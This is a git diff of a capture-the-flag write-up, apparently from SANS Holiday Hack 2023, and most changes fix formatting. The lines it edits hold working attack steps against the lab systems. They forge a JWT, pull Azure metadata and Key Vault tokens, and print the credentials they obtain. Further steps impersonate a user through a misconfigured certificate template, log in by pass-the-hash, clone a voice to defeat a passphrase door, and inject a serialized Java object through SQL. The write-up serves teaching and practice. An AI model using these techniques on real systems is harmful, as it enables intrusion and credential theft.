@@ -1591,7 +1591,7 @@ Payload:
 
 The `GeeseIslandsSuperChiefCommunicationsOfficer` role was assumed based on the captains journal from hint 5.
 
-Ok, using a python script in captains_comms/create_token.py I created the following token:
+Ok, using a python script in [create_token.py](captains_comms/create_token.py) I created the following token:
 
 ```
 eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6IkdlZXNlSXNsYW5kc1N1cGVyQ2hpZWZDb21tdW5pY2F0aW9uc09mZmljZXIifQ.N-8MdT6yPFge7zERpm4VdLdVLMyYcY_Wza1TADoGKK5_85Y5ua59z2Ke0TTyQPa14Z7_Su5CpHZMoxThIEHUWqMzZ8MceUmNGzzIsML7iFQElSsLmBMytHcm9-qzL0Bqb5MeqoHZYTxN0vYG7WaGihYDTB7OxkoO_r4uPSQC8swFJjfazecCqIvl4T5i08p5Ur180GxgEaB-o4fpg_OgReD91ThJXPt7wZd9xMoQjSuPqTPiYrP5o-aaQMcNhSkMix_RX1UGrU-2sBlL01FxI7SjxPYu4eQbACvuK6G2wyuvaQIclGB2Qh3P7rAOTpksZSex9RjtKOiLMCafTyfFng
@@ -1600,13 +1600,16 @@ eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXM
 Link to python library here:
 https://pyjwt.readthedocs.io/en/latest/usage.html#encoding-decoding-tokens-with-rs256-rsa
 
-Lets see if it works by trying to access radio transmitter. Again, we must intercept this request with Burp and edit the Authorization header to put our new token in.
+Lets see if it works by trying to access the radio transmitter. Again, we must intercept this request with Burp and edit the Authorization header to put our new token in.
 
 It worked :)
 
 Now, we need to present the frequency, go time and date to be transmitted. I think it should be:
+
 Frequency: 10426Hz
+
 Go-Date: 1224
+
 Go-Time: 1200
 
 ![transmitter](images/captains_comms/transmitter.png)
@@ -1740,7 +1743,7 @@ The Request is working but I keep getting this error:
 }
 ```
 
-Looks like we need to get a new token with different audience:
+Looks like we need to get a new token with a different audience:
 
 This is the original request for a token from management.azure.com:
 
@@ -1748,7 +1751,7 @@ This is the original request for a token from management.azure.com:
 curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s
 ```
 
-We need to change our audience from management.azure.com to vault.azure.net and re-send the request:
+We need to change our audience from `management.azure.com` to `vault.azure.net` and re-send the request:
 
 ```
 curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fvault.azure.net' -H Metadata:true -s
@@ -1769,7 +1772,9 @@ curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-
 
 Nice. Lets try getting the secrets again, this time with this new token.
 
-`curl https://northpole-it-kv.vault.azure.net/secrets?api-version=7.4 -H "Authorization:Bearer {TOKEN_HERE}"`
+```
+curl https://northpole-it-kv.vault.azure.net/secrets?api-version=7.4 -H "Authorization:Bearer {TOKEN_HERE}"
+```
 
 ```json
 {
@@ -1794,9 +1799,9 @@ Ok, lets see if we can get this secret. Use the following API url.
 
 {vaultBaseUrl}/secrets/{secret-name}/{secret-version}?api-version=7.4
 
-Not sure about version number
-https://stackoverflow.com/questions/48432376/how-to-get-the-latest-secret-version-value-from-azure-key-vault-in-one-rest-api
-Seems from that link we can just ommit it.
+Not sure about version number...
+
+Seems from [this](https://stackoverflow.com/questions/48432376/how-to-get-the-latest-secret-version-value-from-azure-key-vault-in-one-rest-api) link we can just omit it.
 
 Lets try this:
 
@@ -1820,9 +1825,13 @@ curl https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript?api-versio
 ```
 
 **Important Info Found:**
+
 username: elfy
+
 password: J4`ufC49/J4766
+
 ip: 10.0.0.53
+
 hostname: northpole.local
 
 Ok, now I think we can do some stuff with the certipy tool.
@@ -1832,12 +1841,18 @@ Ok, now I think we can do some stuff with the certipy tool.
 Got a bunch of data for bloodhound and a json file stored in the active_directory folder.
 
 Tried this
+
+```
 smbclient.py elfy:J4\`ufC49/J4766@10.0.0.53 -target-ip 10.0.0.53
-Could see a bunch of network shares. Could access FileShare, and I could see a super_secret_research directory but couldnt access it. In a todo.txt file in the FileShare, it says that folder is restricted to researchers only. So I think I need to figure out how to add myself to that group or add a new user to that group.
+```
+
+Could see a bunch of network shares. Could access FileShare, and I could see a super_secret_research directory but couldnt access it. In a todo.txt file in the FileShare, it says that folder is restricted to researchers only. So I think I need to figure out how to add myself to that group or masquerade as a user in that group.
 
 We can use some of the python tools on the machine to look at the AD users:
 
-`python3 GetADUsers.py -all northpole.local/elfy:J4\`ufC49/J4766 -dc-ip 10.0.0.53`
+```
+python3 GetADUsers.py -all northpole.local/elfy:J4\`ufC49/J4766 -dc-ip 10.0.0.53
+```
 
 ```s
 Name                  Email                           PasswordLastSet      LastLogon
@@ -1851,7 +1866,7 @@ wombleycube                                           2023-12-14 01:42:37.135907
 
 wombleycube is the one we want to go after.
 
-I figured out I actually needed to run certipy with the -vulnerable flag.
+I figured out I actually needed to run certipy with the -vulnerable flag (hint in reportinator).
 `certipy find -vulnerable -u elfy@10.0.0.53`
 
 ```json
@@ -1952,9 +1967,7 @@ I figured out I actually needed to run certipy with the -vulnerable flag.
   }
 ```
 
-Following this article, we can exploit the misconfigured Certificate Template and masquerade as another user.
-
-https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/
+Now, following [this](https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/) article, we can exploit the misconfigured Certificate Template and masquerade as another user.
 
 ```s
 certipy req -u elfy@10.0.0.53 -p J4\`ufC49/J4766 -dc-ip 10.0.0.53 -target npdc01.northpole.local -ca northpole-npdc01-CA -template NorthPoleUsers -upn wombleycube@northpole.local
@@ -1966,13 +1979,16 @@ Then we are supposed to get ccache file with this and present it to smbclient.py
 
 `certipy auth -pfx wombleycube.pfx -dc-ip 10.0.0.53`
 
-For some reason using the ccache file did not work, but smbclient also accepts a hash for authentication though, which we did receive from the certipy. Lets do that.
+For some reason using the ccache file did not work, but smbclient also accepts a hash for authentication though, which we did receive from certipy. Lets do that.
 
 Here is the hash we received:
 `[*] Got hash for 'wombleycube@northpole.local': aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23`
 
 Now use smbclient to log in as wombleycube:
-`python3 impacket/smbclient.py wombleycube@10.0.0.53 -target-ip 10.0.0.53 -hashes aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23`
+
+```
+python3 impacket/smbclient.py wombleycube@10.0.0.53 -target-ip 10.0.0.53 -hashes aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23
+```
 
 We're in! Now lets read the file.
 
@@ -2016,7 +2032,11 @@ And he'll silently take his way.
 
 We also got a recording of one of his audiobooks from talking to Wombleycube earlier.
 
-Next, I used https://vocloner.com/ to upload his talk mp3, and then generate a wav file of him saying the secret passphrase. Now play it into the door access speaker. Done!
+Next, I used https://vocloner.com/, an AI voice generator to upload his talk mp3, and then generate a wav file of him saying the secret passphrase. Now play it into the door access speaker.
+
+Files available in [this](space_island_door_access_speaker) directory.
+
+Done!
 
 ## Camera Access
 
@@ -2157,7 +2177,7 @@ Click "Submit Action" and then click Submit.
 
 ![take image](images/camera_access/submit_image.png)
 
-This just took the satellite image. Now we need to find a way to view this Bas64ImageData. By going to the "Parameter service" tab, we can click on "Base64SnapImage" and click "getValue". This will open a popup with the base64 data that is way too long to read and we can't copy it.
+This just took the satellite image. Now we need to find a way to view this Base64ImageData. By going to the "Parameter service" tab, we can click on "Base64SnapImage" and click "getValue". This will open a popup with the base64 data that is way too long to read and we can't copy it.
 
 ![getvalue popup](images/camera_access/getvalue.png)
 
@@ -2193,7 +2213,7 @@ Wombley thinks he may have left the admin tools open. I should check for those i
 
 ### Solution
 
-This challenge has many similarities with the camera access challenge. We are again in the satellite client desktop environment using the Consumer Test Tool. You may have noticed a "missile targeting system" app in the Apps Launcher Service when going through the camera access challenge. This is exactly what we need to use for this challenge. Start the app and connect to it just as we did with the camera app in the camera access challenge.
+This challenge has many similarities with the camera access challenge. We are again in the satellite client desktop environment using the Consumer Test Tool (make sure you set up wireguard too). You may have noticed a "missile targeting system" app in the Apps Launcher Service when going through the camera access challenge. This is exactly what we need to use for this challenge. Start the app and connect to it just as we did with the camera app in the camera access challenge.
 
 #### SQL Injection
 
@@ -2262,15 +2282,15 @@ object: blob
 results: text
 ```
 
-Taking a closer look at the java file (full file in missile_diversion/java), we see that it is a class called SatelliteQueryFileFolderUtility. The class has 3 parameters; isQuery, isUpdate, and pathOrStatement. It seems to function as follows. If isQuery is false, then it assumes pathOrStatement is a file path and returns the contents of the file as a string. If isQuery is true, it assumes pathOrStatement is a MySQL statement and either runs a select statement if isUpdate is false, or runs an update statement if isUpdate is true.
+Taking a closer look at the java file (full file in [missile_diversion/java](missile_diversion/java)), we see that it is a class called SatelliteQueryFileFolderUtility. The class has 3 parameters; isQuery, isUpdate, and pathOrStatement. It seems to function as follows. If isQuery is false, then it assumes pathOrStatement is a file path and returns the contents of the file as a string. If isQuery is true, it assumes pathOrStatement is a MySQL statement and either runs a select statement if isUpdate is false, or runs an update statement if isUpdate is true.
 
 Looking back at the name of the table (satellite_query) it seems that this java class (SatelliteQueryFileFolderUtility) is the backend for this missile diversion app we have been using. The satellie_query table looks like it allows you to insert a serialized java object (of the SatelliteQueryFileFolderUtility class) and then the server will run the object and display the results in the "results" column in the table. This means we should be able to serialize our own SatelliteQueryFileFolderUtility object with the isQuery and isUpdate parameters set to true, and the pathOrStatement parameter set to a MySQL statement that will update the pointing_mode table to sun point mode.
 
 First lets copy the java file from the satellite_query table to our own machine for some modification (use wireshark to view and save the full data as done in the Camera Access challenge above).
 
-Now lets add a main function to this existing java file to serialize our own SatelliteQueryFileFolderUtility object to a binary file. To do this, I asked ChatGPT to write some java code for serializing an object and saving it to a file. Apart from the object instantiation at the beginning the following code was pretty much all auto generated by ChatGPT.
+Now lets add a main function to this existing java file to serialize our own SatelliteQueryFileFolderUtility object to a binary file. To do this, I asked ChatGPT to write some java code for serializing an object and saving it to a file. Apart from the object instantiation at the beginning, the following code was pretty much all auto generated by ChatGPT.
 
-The prompt I gave it was:
+The prompt I gave ChatGPT was:
 
 ```
 Write me a java function which serializes an object and saves it to a file.
@@ -2305,7 +2325,7 @@ public static void main(String args[]) {
 }
 ```
 
-You can see the full original and modified java files in `missile_diversion/java`.
+You can see the full original and modified java files in [missile_diversion/java](missile_diversion/java/).
 
 As you can see in the code above, we create a SatelliteQueryFileFolderUtility object with the pathOrStatement parameter set to a MySQL update query, and both isUpdate and isQuery set to true. Then we serialize the object and write the contents to a file. Next we will convert this binary file into hex so we can insert it into the satellite_query table. The object column in the satellite_query table takes data of type "blob" which is typically binary data. The easiest way to insert an object of this type is with hex.
 
